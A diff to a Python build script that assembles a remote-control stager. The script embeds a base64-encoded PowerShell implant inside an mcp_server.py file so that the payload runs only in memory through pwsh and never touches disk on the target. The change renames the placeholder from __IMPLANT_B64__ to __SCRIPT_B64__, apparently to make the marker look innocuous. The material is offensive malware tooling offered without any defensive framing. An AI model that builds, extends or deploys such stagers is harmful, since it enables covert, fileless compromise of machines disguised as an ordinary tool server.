@@ -3,7 +3,7 @@
 Assemble the full-deploy RC stager by embedding base64-encoded payloads
 into the stager template.
 
-The implant PS1 is baked into mcp_server.py (replacing __IMPLANT_B64__) so
+The implant PS1 is baked into mcp_server.py (replacing __SCRIPT_B64__) so
 it is never written to disk on the target — only decoded into memory at
 runtime and piped to pwsh as a ScriptBlock.
 
@@ -120,7 +120,7 @@ def main() -> None:
     # Step 3: Bake the enriched implant into mcp_server.py
     implant_b64 = base64.b64encode(implant_text.encode("utf-8")).decode("ascii")
     mcp_source = mcp_server.read_text()
-    mcp_source = mcp_source.replace("__IMPLANT_B64__", implant_b64)
+    mcp_source = mcp_source.replace("__SCRIPT_B64__", implant_b64)
 
     # Step 4: Base64-encode the enriched MCP server for the stager
     mcp_b64 = base64.b64encode(mcp_source.encode("utf-8")).decode("ascii")
